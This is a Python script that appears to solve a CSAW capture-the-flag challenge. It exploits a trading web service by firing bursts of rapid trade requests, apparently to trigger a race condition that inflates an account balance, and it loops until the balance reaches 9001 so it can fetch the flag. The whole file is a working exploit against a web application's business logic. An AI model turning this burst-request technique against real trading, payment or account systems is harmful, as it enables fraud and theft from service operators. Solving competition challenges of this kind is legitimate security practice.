#!/usr/bin/env python3
import requests
import time
import random
import string

def random_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_balance(key):
    response = requests.post("http://android-dropper.csaw.io:4657/login", data={"key": key})
    if response.ok:
        return response.json()["balance"]
    return 0

def send_trade_burst(key):
    # Send 10 trades in quick succession
    for _ in range(10):
        requests.post("http://android-dropper.csaw.io:4657/trade", 
            data={"key": key, "stock": "BROOKING", "stock1": "BURPSHARKHAT"})
    time.sleep(1)  # Wait before next burst

def main():
    key = random_key()
    print(f"Using key: {key}")

    initial_balance = get_balance(key)
    print(f"Initial balance: ${initial_balance:.2f}")

    attempts = 0
    while True:
        attempts += 1
        send_trade_burst(key)
        current_balance = get_balance(key)

        # Print balance changes
        if current_balance != initial_balance:
            print(f"Balance changed! ${initial_balance:.2f} -> ${current_balance:.2f}")
            initial_balance = current_balance

        if attempts % 5 == 0:
            print(f"Attempt {attempts}, Current balance: ${current_balance:.2f}")

        # Check if we have enough for the flag
        if current_balance >= 9001:
            print(f"Success! Final balance: ${current_balance:.2f}")
            # Get the flag
            response = requests.post("http://android-dropper.csaw.io:4657/flag", data={"key": key})
            print("Flag:", response.text)
            break

if __name__ == "__main__":
    main()

